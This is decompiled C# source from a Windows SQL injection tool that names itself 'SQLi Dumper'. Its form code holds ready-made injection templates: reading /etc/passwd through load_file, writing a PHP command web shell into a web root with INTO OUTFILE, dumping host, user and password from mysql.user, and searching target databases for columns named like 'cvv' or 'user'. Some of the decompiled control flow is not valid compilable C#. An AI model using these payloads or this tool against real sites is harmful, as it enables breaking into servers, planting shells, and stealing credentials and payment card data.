		this.lblCountBDs.Text = Class50.smethod_5(base.Name, this.lblCountBDs.Name, "-1", class51_0);
		this.txtMySQLReadFilePath.Text = Class50.smethod_5(base.Name, this.txtMySQLReadFilePath.Name, "/etc/passwd", class51_0);
		this.txtMySQLWriteFile.Text = Class50.smethod_5(base.Name, this.txtMySQLWriteFile.Name, "'<? system($_REQUEST['cmd']); ?>'", class51_0);
		this.txtMySQLWriteFilePath.Text = Class50.smethod_5(base.Name, this.txtMySQLWriteFilePath.Name, "'/home/www/HostName_com/html/shell.php'", class51_0);
		this.cmbMySQLWriteFilePath.SelectedItem = Class50.smethod_5(base.Name, this.cmbMySQLWriteFilePath.Name, "INTO OUTFILE", class51_0);
		this.cmbMySQLReadFile.SelectedItem = Class50.smethod_5(base.Name, this.cmbMySQLReadFile.Name, "HEX", class51_0);
		this.txtSearchColumn.Text = Class50.smethod_5(base.Name, this.txtSearchColumn.Name, "mail", class51_0);
		this.chkSearchColumnAllDBs.Checked = Conversions.ToBoolean(Class50.smethod_5(base.Name, this.chkSearchColumnAllDBs.Name, "False", class51_0));
		this.string_0 = Class50.smethod_5(base.Name, "__CurrentDataBase", "", class51_0);
		string text = Class50.smethod_5(base.Name, this.trwSchema.Name + ".Selected", "", class51_0);
		if (!string.IsNullOrEmpty(text))
		{
			string[] array = Strings.Split(text, ":", -1, CompareMethod.Binary);
			TreeNode treeNode = null;
			switch (array.Length)
			{
			case 1:
				treeNode = this.method_52(Schema.DATABASES, array[0], "", "");
				break;
			case 2:
				treeNode = this.method_52(Schema.TABLES, array[0], array[1], "");
				break;
			case 3:
				treeNode = this.method_52(Schema.COLUMNS, array[0], array[1], array[2]);
				break;
			}
			if (!Information.IsNothing(treeNode))
			{
				this.trwSchema.SelectedNode = treeNode;
				treeNode.EnsureVisible();
			}
		}
		string text2 = Class23.smethod_12(this.txtURL.Text);
		if (global::Globals.G_DataGP.CountryCodeExist(text2))
		{
			this.lblCountry.Image = global::Globals.GMain.imgData.Images[text2 + ".png"];
		}
		if (this.lblVersion.Text.StartsWith("4"))
		{
			this.lblVersion.ForeColor = Color.Red;
		}
		else if (!string.IsNullOrEmpty(this.lblVersion.Text))
		{
			this.lblVersion.ForeColor = Color.Blue;
		}
		else
		{
			this.lblVersion.ForeColor = this.ForeColor;
		}
	}

	// Token: 0x060006BD RID: 1725 RVA: 0x0002EEA0 File Offset: 0x0002D0A0
	private void method_81(Class51 class51_0)
	{
		Class50.smethod_3(this, class51_0);
		Class50.smethod_4(base.Name, this.txtURL.Name, this.txtURL.Text, class51_0);
		Class50.smethod_4(base.Name, this.cmbSqlType.Name, Conversions.ToString(this.cmbSqlType.SelectedItem), class51_0);
		Class50.smethod_4(base.Name, this.lblVersion.Name, this.lblVersion.Text, class51_0);
		Class50.smethod_4(base.Name, this.lblCountry.Name, this.lblCountry.Text, class51_0);
		Class50.smethod_4(base.Name, this.lblCountBDs.Name, this.lblCountBDs.Text, class51_0);
		Class50.smethod_4(base.Name, this.txtMySQLReadFilePath.Name, this.txtMySQLReadFilePath.Text, class51_0);
		Class50.smethod_4(base.Name, this.txtMySQLWriteFile.Name, this.txtMySQLWriteFile.Text, class51_0);
		Class50.smethod_4(base.Name, this.txtMySQLWriteFilePath.Name, this.txtMySQLWriteFilePath.Text, class51_0);
		Class50.smethod_4(base.Name, this.cmbMySQLWriteFilePath.Name, Conversions.ToString(this.cmbMySQLWriteFilePath.SelectedItem), class51_0);
		Class50.smethod_4(base.Name, this.cmbMySQLReadFile.Name, Conversions.ToString(this.cmbMySQLReadFile.SelectedItem), class51_0);
		Class50.smethod_4(base.Name, this.txtSearchColumn.Name, this.txtSearchColumn.Text, class51_0);
		Class50.smethod_4(base.Name, this.chkSearchColumnAllDBs.Name, Conversions.ToString(this.chkSearchColumnAllDBs.Checked), class51_0);
		Class50.smethod_4(base.Name, "__CurrentDataBase", this.string_0, class51_0);
		if (this.trwSchema.SelectedNode != null)
		{
			string text = "";
			foreach (string text2 in Strings.Split(this.trwSchema.SelectedNode.FullPath, this.trwSchema.PathSeparator, -1, CompareMethod.Binary))
			{
				text2 = this.method_41(text2);
				if (!string.IsNullOrEmpty(text))
				{
					text += ":";
				}
				text += text2;
			}
			Class50.smethod_4(base.Name, this.trwSchema.Name + ".Selected", text, class51_0);
		}
		else
		{
			Class50.smethod_4(base.Name, this.trwSchema.Name + ".Selected", "", class51_0);
		}
	}

	// Token: 0x060006BE RID: 1726 RVA: 0x0002F138 File Offset: 0x0002D338
	internal bool method_82(string string_9)
	{
		try
		{
			if (File.Exists(global::Globals.SCHEMA_PATH + string_9))
			{
				File.Delete(global::Globals.SCHEMA_PATH + string_9);
				this.UpDateStatus(global::Globals.translate_0.GetStr(this, 57, "") + " (" + string_9 + ")", false);
				return true;
			}
		}
		catch (Exception ex)
		{
			this.UpDateStatus(ex.ToString(), false);
		}
		return false;
	}

	// Token: 0x060006BF RID: 1727 RVA: 0x0002F1C8 File Offset: 0x0002D3C8
	private void Dumper_FormClosing(object sender, FormClosingEventArgs e)
	{
		if (!global::Globals.IS_DUMP_INSTANCE)
		{
			this.method_74();
		}
	}

	// Token: 0x060006C0 RID: 1728 RVA: 0x0002F1DC File Offset: 0x0002D3DC
	private void method_83(object sender, EventArgs e)
	{
		if (!this.bool_2)
		{
			this.method_79(this.tscSchemas.Text);
		}
		else
		{
			Interaction.Beep();
		}
	}

	// Token: 0x060006C1 RID: 1729 RVA: 0x0002F204 File Offset: 0x0002D404
	private void method_84(object sender, EventArgs e)
	{
		this.method_77();
	}

	// Token: 0x060006C2 RID: 1730 RVA: 0x0002F20C File Offset: 0x0002D40C
	private void method_85(object sender, EventArgs e)
	{
		if (!string.IsNullOrEmpty(this.tscSchemas.Text))
		{
			using (new Class8(global::Globals.GMain))
			{
				if (MessageBox.Show(global::Globals.translate_0.GetStr(this, 58, "") + " '" + this.tscSchemas.Text + "'?", global::Globals.APP_VERSION, MessageBoxButtons.YesNo, MessageBoxIcon.Exclamation) == DialogResult.Yes && this.method_82(this.tscSchemas.Text))
				{
					this.tscSchemas.Items.Remove(this.tscSchemas.Text);
				}
			}
		}
	}

	// Token: 0x060006C3 RID: 1731 RVA: 0x0002F2C4 File Offset: 0x0002D4C4
	private void method_86(object sender, EventArgs e)
	{
		string text = "";
		checked
		{
			try
			{
				int num = 1;
				byte b = 0;
				foreach (char c in this.txtURL.Text.ToCharArray())
				{
					if (Operators.CompareString(Conversions.ToString(c), "/", false) == 0)
					{
						b += 1;
						if (b > 2)
						{
							break;
						}
					}
					num++;
				}
				text = this.txtURL.Text.Substring(0, num - 1);
				text = text.Replace("http://", "");
				text = text.Replace("https://", "");
				text = text.Replace("/", "");
				text = text.Replace("\\", "");
				text = text.Replace(":", "_");
				text = text.Replace("www.", "");
				using (ImpBox impBox = new ImpBox())
				{
					impBox.Text = global::Globals.translate_0.GetStr(this, 60, "");
					impBox.txtValue.Text = text;
					impBox.ShowDialog(this);
					if (impBox.DialogResult == DialogResult.OK)
					{
						text = impBox.txtValue.Text.Trim();
					}
					else
					{
						text = "";
					}
				}
				if (!string.IsNullOrEmpty(text) && !text.ToLower().EndsWith(".xml"))
				{
					text += ".xml";
				}
			}
			catch (Exception ex)
			{
			}
			if (!string.IsNullOrEmpty(text))
			{
				this.method_78(text);
			}
		}
	}

	// Token: 0x060006C4 RID: 1732 RVA: 0x0002F494 File Offset: 0x0002D694
	private void method_87(object sender, EventArgs e)
	{
		string text = Clipboard.GetText();
		if (text.ToLower().StartsWith("http"))
		{
			this.txtURL.Text = text;
		}
	}

	// Token: 0x060006C5 RID: 1733 RVA: 0x0002F4C8 File Offset: 0x0002D6C8
	private void method_88(object sender, EventArgs e)
	{
		this.method_0(Dumper.Enum5.const_7);
	}

	// Token: 0x060006C6 RID: 1734 RVA: 0x0002F4D4 File Offset: 0x0002D6D4
	private void method_89(object sender, EventArgs e)
	{
		this.method_0(Dumper.Enum5.const_8);
	}

	// Token: 0x060006C7 RID: 1735 RVA: 0x0002F4E0 File Offset: 0x0002D6E0
	internal void method_90(object sender, EventArgs e)
	{
		this.method_0(Dumper.Enum5.const_0);
	}

	// Token: 0x060006C8 RID: 1736 RVA: 0x0002F4EC File Offset: 0x0002D6EC
	private void method_91(object sender, EventArgs e)
	{
		this.method_0(Dumper.Enum5.const_1);
	}

	// Token: 0x060006C9 RID: 1737 RVA: 0x0002F4F8 File Offset: 0x0002D6F8
	private void method_92(object sender, EventArgs e)
	{
		this.method_0(Dumper.Enum5.const_2);
	}

	// Token: 0x060006CA RID: 1738 RVA: 0x0002F504 File Offset: 0x0002D704
	private void method_93(object sender, EventArgs e)
	{
		this.method_0(Dumper.Enum5.const_3);
	}

	// Token: 0x060006CB RID: 1739 RVA: 0x0002F510 File Offset: 0x0002D710
	private void method_94(object sender, EventArgs e)
	{
		this.bool_4 = true;
		this.method_0(Dumper.Enum5.const_4);
	}

	// Token: 0x060006CC RID: 1740 RVA: 0x0002F520 File Offset: 0x0002D720
	private void method_95(object sender, EventArgs e)
	{
		this.method_0(Dumper.Enum5.const_5);
	}

	// Token: 0x060006CD RID: 1741 RVA: 0x0002F52C File Offset: 0x0002D72C
	private void method_96(object sender, EventArgs e)
	{
		checked
		{
			try
			{
				TreeNode parent = this.trwSchema.SelectedNode.Parent;
				TreeNode treeNode = (TreeNode)this.trwSchema.SelectedNode.Clone();
				int index = this.trwSchema.SelectedNode.Index;
				if (sender == this.btnColumnUp)
				{
					if (index != 0)
					{
						this.trwSchema.SelectedNode.Remove();
						parent.Nodes.Insert(index - 1, treeNode);
					}
				}
				else if (index != parent.Nodes.Count - 1)
				{
					this.trwSchema.SelectedNode.Remove();
					parent.Nodes.Insert(index + 1, treeNode);
				}
				this.trwSchema.SelectedNode = treeNode;
			}
			catch (Exception ex)
			{
				MessageBox.Show(ex.Message);
			}
		}
	}

	// Token: 0x060006CE RID: 1742 RVA: 0x0002F610 File Offset: 0x0002D810
	private void method_97(object sender, EventArgs e)
	{
		this.cmbMSSQLCast.Enabled = this.chkMSSQLCastAsChar.Checked;
	}

	// Token: 0x060006CF RID: 1743 RVA: 0x0002F628 File Offset: 0x0002D828
	private void method_98(object sender, EventArgs e)
	{
		int num;
		int num4;
		object obj;
		try
		{
			IL_0002:
			ProjectData.ClearProjectError();
			num = -2;
			IL_000A:
			int num2 = 2;
			bool flag = Class23.smethod_13(this.txtURL.Text, false);
			IL_001E:
			num2 = 3;
			this.btnServerInfo.Enabled = flag;
			IL_002C:
			num2 = 4;
			this.btnDumpCustom.Enabled = flag;
			IL_003A:
			num2 = 5;
			if (!(!flag & !string.IsNullOrEmpty(this.txtURL.Text)))
			{
				goto IL_0071;
			}
			IL_0056:
			num2 = 6;
			this.UpDateStatus(global::Globals.translate_0.GetStr(this, 61, ""), false);
			IL_0071:
			num2 = 8;
			this.string_1 = this.txtURL.Text.Trim();
			IL_0089:
			goto IL_0104;
			IL_008B:
			int num3 = num4 + 1;
			num4 = 0;
			@switch(ICSharpCode.Decompiler.ILAst.ILLabel[], num3);
			IL_00BD:
			goto IL_00F9;
			IL_00BF:
			num4 = num2;
			@switch(ICSharpCode.Decompiler.ILAst.ILLabel[], (num > -2) ? num : 1);
			IL_00D7:;
		}
		catch when (endfilter((obj is Exception) & (num != 0) & (num4 == 0)))
		{
			Exception ex = (Exception)obj2;
			goto IL_00BF;
		}
		IL_00F9:
		throw ProjectData.CreateProjectError(-2146828237);
		IL_0104:
		if (num4 != 0)
		{
			ProjectData.ClearProjectError();
		}
	}

	// Token: 0x060006D0 RID: 1744 RVA: 0x0002F754 File Offset: 0x0002D954
	private void method_99(object sender, EventArgs e)
	{
		global::Globals.LockWindowUpdate(this.splData.Handle);
		this.types_0 = Class54.smethod_6(Conversions.ToString(this.cmbSqlType.SelectedItem));
		bool flag = Class54.smethod_9(this.types_0);
		bool flag2 = Class54.smethod_10(this.types_0);
		bool flag3 = Class54.smethod_11(this.types_0);
		bool flag4 = Class54.smethod_12(this.types_0);
		if (this.types_0 == Types.MySQL_No_Error)
		{
			if (!this.tbcMain.TabPages.Contains(this.tpMyLoadFile))
			{
				this.tbcMain.TabPages.Add(this.tpMyLoadFile);
			}
		}
		else if (this.tbcMain.TabPages.Contains(this.tpMyLoadFile))
		{
			this.tbcMain.TabPages.Remove(this.tpMyLoadFile);
		}
		this.mnuConvCharGroup.Visible = flag;
		this.mnuConvHex.Visible = !flag3 & !flag4;
		this.splQuery.Panel2Collapsed = flag2 || flag3 || flag4;
		this.lblSelect.Visible = flag;
		this.grbMySQLCollactions.Visible = flag;
		this.cmbMySQLErrType.Enabled = this.types_0 == Types.MySQL_With_Error;
		this.grbMSSQLCollactions.Visible = flag2;
		this.grbOracleCollactions.Visible = flag3;
		this.cmbOracleErrType.Enabled = this.types_0 == Types.Oracle_With_Error;
		this.chkDumpEncodedHex.Enabled = this.types_0 == Types.MySQL_No_Error;
		this.chkDumpIFNULL.Enabled = flag;
		this.chkDumpFieldByField.Checked = this.types_0 == Types.MySQL_With_Error;
		this.chkDumpFieldByField.Enabled = this.types_0 == Types.MySQL_No_Error;
		this.chkAllInOneRequest.Enabled = this.types_0 == Types.MySQL_No_Error;
		this.grbMySQLSplitRows.Visible = this.types_0 == Types.MySQL_With_Error;
		if (flag2)
		{
			this.numFieldByField.Value = 1m;
			this.numFieldByField.Maximum = 1m;
		}
		else
		{
			this.numFieldByField.Maximum = 30m;
		}
		if (sender != null)
		{
			bool flag5;
			if ((flag5 = true) == flag)
			{
				this.mnuTemplates.DropDown = this.ctmTemplatesMySQL;
				if (this.$STATIC$cmbSqlType_SelectedIndexChanged$20211C12819D$sSelect$Init == null)
				{
					Interlocked.CompareExchange<StaticLocalInitFlag>(ref this.$STATIC$cmbSqlType_SelectedIndexChanged$20211C12819D$sSelect$Init, new StaticLocalInitFlag(), null);
				}
				bool flag6 = false;
				try
				{
					Monitor.Enter(this.$STATIC$cmbSqlType_SelectedIndexChanged$20211C12819D$sSelect$Init, ref flag6);
					if (this.$STATIC$cmbSqlType_SelectedIndexChanged$20211C12819D$sSelect$Init.State == 0)
					{
						this.$STATIC$cmbSqlType_SelectedIndexChanged$20211C12819D$sSelect$Init.State = 2;
						this.$STATIC$cmbSqlType_SelectedIndexChanged$20211C12819D$sSelect = this.txtCustomQuery.Text;
					}
					else if (this.$STATIC$cmbSqlType_SelectedIndexChanged$20211C12819D$sSelect$Init.State == 2)
					{
						throw new IncompleteInitialization();
					}
				}
				finally
				{
					this.$STATIC$cmbSqlType_SelectedIndexChanged$20211C12819D$sSelect$Init.State = 1;
					if (flag6)
					{
						Monitor.Exit(this.$STATIC$cmbSqlType_SelectedIndexChanged$20211C12819D$sSelect$Init);
					}
				}
				if (this.$STATIC$cmbSqlType_SelectedIndexChanged$20211C12819D$sFrom$Init == null)
				{
					Interlocked.CompareExchange<StaticLocalInitFlag>(ref this.$STATIC$cmbSqlType_SelectedIndexChanged$20211C12819D$sFrom$Init, new StaticLocalInitFlag(), null);
				}
				bool flag7 = false;
				try
				{
					Monitor.Enter(this.$STATIC$cmbSqlType_SelectedIndexChanged$20211C12819D$sFrom$Init, ref flag7);
					if (this.$STATIC$cmbSqlType_SelectedIndexChanged$20211C12819D$sFrom$Init.State == 0)
					{
						this.$STATIC$cmbSqlType_SelectedIndexChanged$20211C12819D$sFrom$Init.State = 2;
						this.$STATIC$cmbSqlType_SelectedIndexChanged$20211C12819D$sFrom = this.txtCustomQueryFrom.Text;
					}
					else if (this.$STATIC$cmbSqlType_SelectedIndexChanged$20211C12819D$sFrom$Init.State == 2)
					{
						throw new IncompleteInitialization();
					}
				}
				finally
				{
					this.$STATIC$cmbSqlType_SelectedIndexChanged$20211C12819D$sFrom$Init.State = 1;
					if (flag7)
					{
						Monitor.Exit(this.$STATIC$cmbSqlType_SelectedIndexChanged$20211C12819D$sFrom$Init);
					}
				}
				this.txtCustomQuery.Text = this.$STATIC$cmbSqlType_SelectedIndexChanged$20211C12819D$sSelect;
				this.$STATIC$cmbSqlType_SelectedIndexChanged$20211C12819D$sSelect = this.txtCustomQuery.Text;
				this.txtCustomQueryFrom.Text = this.$STATIC$cmbSqlType_SelectedIndexChanged$20211C12819D$sFrom;
				this.$STATIC$cmbSqlType_SelectedIndexChanged$20211C12819D$sFrom = this.txtCustomQuery.Text;
			}
			else if (flag5 == flag2)
			{
				if (this.$STATIC$cmbSqlType_SelectedIndexChanged$20211C12819D$sQuery$Init == null)
				{
					Interlocked.CompareExchange<StaticLocalInitFlag>(ref this.$STATIC$cmbSqlType_SelectedIndexChanged$20211C12819D$sQuery$Init, new StaticLocalInitFlag(), null);
				}
				bool flag8 = false;
				try
				{
					Monitor.Enter(this.$STATIC$cmbSqlType_SelectedIndexChanged$20211C12819D$sQuery$Init, ref flag8);
					if (this.$STATIC$cmbSqlType_SelectedIndexChanged$20211C12819D$sQuery$Init.State == 0)
					{
						this.$STATIC$cmbSqlType_SelectedIndexChanged$20211C12819D$sQuery$Init.State = 2;
						this.$STATIC$cmbSqlType_SelectedIndexChanged$20211C12819D$sQuery = this.txtCustomQuery.Text;
					}
					else if (this.$STATIC$cmbSqlType_SelectedIndexChanged$20211C12819D$sQuery$Init.State == 2)
					{
						throw new IncompleteInitialization();
					}
				}
				finally
				{
					this.$STATIC$cmbSqlType_SelectedIndexChanged$20211C12819D$sQuery$Init.State = 1;
					if (flag8)
					{
						Monitor.Exit(this.$STATIC$cmbSqlType_SelectedIndexChanged$20211C12819D$sQuery$Init);
					}
				}
				this.txtCustomQuery.Text = this.$STATIC$cmbSqlType_SelectedIndexChanged$20211C12819D$sQuery;
				this.$STATIC$cmbSqlType_SelectedIndexChanged$20211C12819D$sQuery = this.txtCustomQuery.Text;
				this.mnuTemplates.DropDown = this.ctmTemplatesMSSQL;
			}
			else if (flag5 == flag3)
			{
				if (this.$STATIC$cmbSqlType_SelectedIndexChanged$20211C12819D$sQuery2$Init == null)
				{
					Interlocked.CompareExchange<StaticLocalInitFlag>(ref this.$STATIC$cmbSqlType_SelectedIndexChanged$20211C12819D$sQuery2$Init, new StaticLocalInitFlag(), null);
				}
				bool flag9 = false;
				try
				{
					Monitor.Enter(this.$STATIC$cmbSqlType_SelectedIndexChanged$20211C12819D$sQuery2$Init, ref flag9);
					if (this.$STATIC$cmbSqlType_SelectedIndexChanged$20211C12819D$sQuery2$Init.State == 0)
					{
						this.$STATIC$cmbSqlType_SelectedIndexChanged$20211C12819D$sQuery2$Init.State = 2;
						this.$STATIC$cmbSqlType_SelectedIndexChanged$20211C12819D$sQuery2 = this.txtCustomQuery.Text;
					}
					else if (this.$STATIC$cmbSqlType_SelectedIndexChanged$20211C12819D$sQuery2$Init.State == 2)
					{
						throw new IncompleteInitialization();
					}
				}
				finally
				{
					this.$STATIC$cmbSqlType_SelectedIndexChanged$20211C12819D$sQuery2$Init.State = 1;
					if (flag9)
					{
						Monitor.Exit(this.$STATIC$cmbSqlType_SelectedIndexChanged$20211C12819D$sQuery2$Init);
					}
				}
				this.txtCustomQuery.Text = this.$STATIC$cmbSqlType_SelectedIndexChanged$20211C12819D$sQuery2;
				this.$STATIC$cmbSqlType_SelectedIndexChanged$20211C12819D$sQuery2 = this.txtCustomQuery.Text;
				this.mnuTemplates.DropDown = this.ctmTemplatesOracle;
			}
			else if (flag5 == flag4)
			{
				if (this.$STATIC$cmbSqlType_SelectedIndexChanged$20211C12819D$sQuery3$Init == null)
				{
					Interlocked.CompareExchange<StaticLocalInitFlag>(ref this.$STATIC$cmbSqlType_SelectedIndexChanged$20211C12819D$sQuery3$Init, new StaticLocalInitFlag(), null);
				}
				bool flag10 = false;
				try
				{
					Monitor.Enter(this.$STATIC$cmbSqlType_SelectedIndexChanged$20211C12819D$sQuery3$Init, ref flag10);
					if (this.$STATIC$cmbSqlType_SelectedIndexChanged$20211C12819D$sQuery3$Init.State == 0)
					{
						this.$STATIC$cmbSqlType_SelectedIndexChanged$20211C12819D$sQuery3$Init.State = 2;
						this.$STATIC$cmbSqlType_SelectedIndexChanged$20211C12819D$sQuery3 = this.txtCustomQuery.Text;
					}
					else if (this.$STATIC$cmbSqlType_SelectedIndexChanged$20211C12819D$sQuery3$Init.State == 2)
					{
						throw new IncompleteInitialization();
					}
				}
				finally
				{
					this.$STATIC$cmbSqlType_SelectedIndexChanged$20211C12819D$sQuery3$Init.State = 1;
					if (flag10)
					{
						Monitor.Exit(this.$STATIC$cmbSqlType_SelectedIndexChanged$20211C12819D$sQuery3$Init);
					}
				}
				this.txtCustomQuery.Text = this.$STATIC$cmbSqlType_SelectedIndexChanged$20211C12819D$sQuery3;
				this.$STATIC$cmbSqlType_SelectedIndexChanged$20211C12819D$sQuery3 = this.txtCustomQuery.Text;
				this.mnuTemplates.DropDown = this.ctmTemplatesPostgreSQL;
			}
		}
		global::Globals.LockWindowUpdate(IntPtr.Zero);
	}

	// Token: 0x060006D1 RID: 1745 RVA: 0x0002FD80 File Offset: 0x0002DF80
	private void method_100(object sender, EventArgs e)
	{
	}

	// Token: 0x060006D2 RID: 1746 RVA: 0x0002FD84 File Offset: 0x0002DF84
	private void method_101(object sender, EventArgs e)
	{
		this.txtPost.Enabled = this.cmbMethod.SelectedIndex == 1;
	}

	// Token: 0x060006D3 RID: 1747 RVA: 0x0002FDA0 File Offset: 0x0002DFA0
	private void method_102(object sender, EventArgs e)
	{
		if (Class54.smethod_9(this.types_0))
		{
			this.lblFrom.Visible = !this.txtCustomQueryFrom.Text.ToLower().Contains("into outfile") & !this.txtCustomQueryFrom.Text.ToLower().Contains("into dumpfile") & !string.IsNullOrEmpty(this.txtCustomQueryFrom.Text);
		}
	}

	// Token: 0x060006D4 RID: 1748 RVA: 0x0002FE14 File Offset: 0x0002E014
	private void method_103(object sender, EventArgs e)
	{
		if (Class54.smethod_9(this.types_0))
		{
			this.txtCustomQuery.Clear();
			this.txtCustomQueryFrom.Clear();
		}
		else
		{
			this.txtCustomQuery.Clear();
		}
	}

	// Token: 0x060006D5 RID: 1749 RVA: 0x0002FE48 File Offset: 0x0002E048
	private void method_104(object sender, EventArgs e)
	{
		this.txtCustomQuery.Text = "@@hostname,\r\n@@datadir";
		this.txtCustomQueryFrom.Text = "";
	}

	// Token: 0x060006D6 RID: 1750 RVA: 0x0002FE6C File Offset: 0x0002E06C
	private void method_105(object sender, EventArgs e)
	{
		this.txtCustomQuery.Text = "grantee,\r\nprivilege_type,\r\nis_grantable";
		this.txtCustomQueryFrom.Text = "information_schema.user_privileges\r\nwhere privilege_type=0x5355504552\r\nlimit [x],[y]";
	}

	// Token: 0x060006D7 RID: 1751 RVA: 0x0002FE90 File Offset: 0x0002E090
	private void method_106(object sender, EventArgs e)
	{
		this.txtCustomQuery.Text = "md5(user()),sha1(user()),password(user())";
		this.txtCustomQueryFrom.Text = "";
	}

	// Token: 0x060006D8 RID: 1752 RVA: 0x0002FEB4 File Offset: 0x0002E0B4
	private void method_107(object sender, EventArgs e)
	{
		this.txtCustomQuery.Text = "user(),database(),version()";
		this.txtCustomQueryFrom.Text = "";
	}

	// Token: 0x060006D9 RID: 1753 RVA: 0x0002FED8 File Offset: 0x0002E0D8
	private void method_108(object sender, EventArgs e)
	{
		this.txtCustomQuery.Text = "load_file(0x2f6574632f706173737764),\r\nlength(load_file(0x2f6574632f706173737764))";
		this.txtCustomQueryFrom.Text = "";
	}

	// Token: 0x060006DA RID: 1754 RVA: 0x0002FEFC File Offset: 0x0002E0FC
	private void method_109(object sender, EventArgs e)
	{
		this.txtCustomQuery.Text = "'<? system($_REQUEST['cmd']); ?>'";
		this.txtCustomQueryFrom.Text = "into outfile '/var/www/html/site_com/evil.php'";
	}

	// Token: 0x060006DB RID: 1755 RVA: 0x0002FF20 File Offset: 0x0002E120
	private void method_110(object sender, EventArgs e)
	{
		this.txtCustomQuery.Text = "hex('powered by SQLi Dumper')";
		this.txtCustomQueryFrom.Text = "into dumpfile '/etc/passwd/a.bin'";
	}

	// Token: 0x060006DC RID: 1756 RVA: 0x0002FF44 File Offset: 0x0002E144
	private void method_111(object sender, EventArgs e)
	{
		this.txtCustomQuery.Text = "grantee,\r\nprivilege_type,\r\nis_grantable";
		this.txtCustomQueryFrom.Text = "information_schema.user_privileges\r\nlimit [x],[y]";
	}

	// Token: 0x060006DD RID: 1757 RVA: 0x0002FF68 File Offset: 0x0002E168
	private void method_112(object sender, EventArgs e)
	{
		this.txtCustomQuery.Text = "host,\r\nuser,\r\npassword";
		this.txtCustomQueryFrom.Text = "mysql.user\r\nlimit [x],[y]";
	}

	// Token: 0x060006DE RID: 1758 RVA: 0x0002FF8C File Offset: 0x0002E18C
	private void method_113(object sender, EventArgs e)
	{
		this.txtCustomQuery.Text = "C.table_schema,\r\nC.table_name,\r\nC.column_name";
		this.txtCustomQueryFrom.Text = "information_schema.columns AS C\r\nwhere C.column_name like " + Class23.smethod_20("%user%") + "\r\nand not C.table_schema in (0x696e666f726d6174696f6e5f736368656d61,0x6d7973716c)\r\nlimit [x],[y]";
	}

	// Token: 0x060006DF RID: 1759 RVA: 0x0002FFC4 File Offset: 0x0002E1C4
	private void method_114(object sender, EventArgs e)
	{
		this.txtCustomQuery.Text = "C.table_schema,\r\nC.table_name,\r\nC.column_name";
		this.txtCustomQueryFrom.Text = "information_schema.columns AS C\r\nwhere C.column_name LIKE " + Class23.smethod_20("%cvv%") + "\r\nlimit [x],[y]";
	}

	// Token: 0x060006E0 RID: 1760 RVA: 0x0002FFFC File Offset: 0x0002E1FC
	private void method_115(object sender, EventArgs e)
	{
		this.txtCustomQuery.Text = "D.schema_name,\r\nT.table_name,\r\nC.column_name";
		this.txtCustomQueryFrom.Text = "information_schema.schemata AS D\r\nJOIN information_schema.tables AS T ON T.table_schema = D.schema_name\r\nJOIN information_schema.columns AS C ON C.table_schema = D.schema_name AND C.table_name = T.table_name\r\nWHERE D.schema_name = database()\r\nlimit [x],[y]";
	}

	// Token: 0x060006E1 RID: 1761 RVA: 0x00030020 File Offset: 0x0002E220
	private void method_116(object sender, EventArgs e)
	{
		this.txtCustomQuery.Text = "LENGTH(DATABASE())";
		this.txtCustomQueryFrom.Clear();
	}

	// Token: 0x060006E2 RID: 1762 RVA: 0x00030040 File Offset: 0x0002E240
	private void method_117(object sender, EventArgs e)
	{
		TextBox txtCustomQueryFrom;
		(txtCustomQueryFrom = this.txtCustomQueryFrom).Text = txtCustomQueryFrom.Text + "\r\nlimit [x],[y]";
	}

	// Token: 0x060006E3 RID: 1763 RVA: 0x0003006C File Offset: 0x0002E26C
	private void method_118(object sender, CancelEventArgs e)
	{
		bool flag = Class54.smethod_9(this.types_0);
		bool flag2 = Class54.smethod_10(this.types_0);
		bool flag3 = Class54.smethod_11(this.types_0);
		bool flag4 = Class54.smethod_12(this.types_0);
		bool flag5 = this.types_0 == Types.MySQL_With_Error;
		List<ToolStripMenuItem> list = new List<ToolStripMenuItem>();
		if (this.trwSchema.SelectedNode == null)
		{
			if (flag)
			{
				ToolStripMenuItem toolStripMenuItem = new ToolStripMenuItem("information_schema");
				list.Add(toolStripMenuItem);
				toolStripMenuItem.Enabled = false;
				toolStripMenuItem = new ToolStripMenuItem("  schema");
				list.Add(toolStripMenuItem);
				toolStripMenuItem.Enabled = false;
				toolStripMenuItem = new ToolStripMenuItem("    schema_name");
				list.Add(toolStripMenuItem);
			}
			else if (flag2)
			{
				ToolStripMenuItem toolStripMenuItem = new ToolStripMenuItem("master");
				list.Add(toolStripMenuItem);
				toolStripMenuItem.Enabled = false;
				toolStripMenuItem = new ToolStripMenuItem("  sysdatabases");
				list.Add(toolStripMenuItem);
				toolStripMenuItem.Enabled = false;
				toolStripMenuItem = new ToolStripMenuItem("    [name]");
				list.Add(toolStripMenuItem);
			}
			else if (flag3)
			{
				ToolStripMenuItem toolStripMenuItem = new ToolStripMenuItem("SYS");
				list.Add(toolStripMenuItem);
				toolStripMenuItem.Enabled = false;
				toolStripMenuItem = new ToolStripMenuItem("  all_tables");
				list.Add(toolStripMenuItem);
				toolStripMenuItem.Enabled = false;
				toolStripMenuItem = new ToolStripMenuItem("    owner");
				list.Add(toolStripMenuItem);
			}
			else if (flag4)
			{
				ToolStripMenuItem toolStripMenuItem = new ToolStripMenuItem("pg_database");
				list.Add(toolStripMenuItem);
				toolStripMenuItem.Enabled = false;
				toolStripMenuItem = new ToolStripMenuItem("  datname");
				list.Add(toolStripMenuItem);
			}
		}
		else
		{
			int level = this.trwSchema.SelectedNode.Level;
			ToolStripMenuItem toolStripMenuItem;
			switch (this.trwSchema.SelectedNode.Level)
			{
			case 0:
				if (flag)
				{
					toolStripMenuItem = new ToolStripMenuItem("information_schema");
					list.Add(toolStripMenuItem);
					toolStripMenuItem.Enabled = false;
					toolStripMenuItem = new ToolStripMenuItem("  schema");
					list.Add(toolStripMenuItem);
					toolStripMenuItem.Enabled = false;
					toolStripMenuItem = new ToolStripMenuItem("    schema_name");
					list.Add(toolStripMenuItem);
					toolStripMenuItem = new ToolStripMenuItem("  tables");
					list.Add(toolStripMenuItem);
					toolStripMenuItem.Enabled = false;
					toolStripMenuItem = new ToolStripMenuItem("    table_name");
					list.Add(toolStripMenuItem);
					toolStripMenuItem = new ToolStripMenuItem("    table_schema");
					list.Add(toolStripMenuItem);
					goto IL_075A;
				}
				if (flag2)
				{
					toolStripMenuItem = new ToolStripMenuItem("master");
					list.Add(toolStripMenuItem);
					toolStripMenuItem.Enabled = false;
					toolStripMenuItem = new ToolStripMenuItem("  sysdatabases");
					list.Add(toolStripMenuItem);
					toolStripMenuItem.Enabled = false;
					toolStripMenuItem = new ToolStripMenuItem("    [name]");
					list.Add(toolStripMenuItem);
					toolStripMenuItem = new ToolStripMenuItem("  sysobjects");
					list.Add(toolStripMenuItem);
